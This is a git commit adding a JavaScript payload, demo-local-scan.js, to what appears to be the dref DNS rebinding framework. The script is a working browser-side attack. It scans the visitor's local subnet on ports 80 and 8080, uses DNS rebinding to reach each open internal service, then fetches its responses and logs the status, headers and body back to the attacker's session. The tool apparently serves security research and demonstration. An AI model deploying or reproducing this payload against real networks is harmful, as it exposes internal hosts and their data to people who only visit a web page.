74fd4d6f89f4cb7f1827b92ef4f8617caab19327
serain <alex@kaskaso.li>
2019-10-26 21:09:01 +0100

    add demo for local scan

---
+++ dref/scripts/src/payloads/demo-local-scan.js
@@ -0,0 +1,31 @@
+import NetMap from 'netmap.js'
+import * as network from '../libs/network'
+import Session from '../libs/session'
+
+const session = new Session()
+
+async function mainFrame () {
+  const netmap = new NetMap()
+  const localSubnet = await network.getLocalSubnet(24)
+
+  netmap.tcpScan(localSubnet, [80, 8080]).then(results => {
+    for (let h of results.hosts) {
+      for (let p of h.ports) {
+        if (p.open) session.createFastRebindFrame(h.host, p.port)
+      }
+    }
+  })
+}
+
+function rebindFrame () {
+  session.triggerFastRebind().then(() => {
+    network.get(session.baseURL, {
+      successCb: (code, headers, body) => {
+        session.log({ code: code, headers: headers, body: body })
+      }
+    })
+  })
+}
+
+if (window.args && window.args._rebind) rebindFrame()
+else mainFrame()
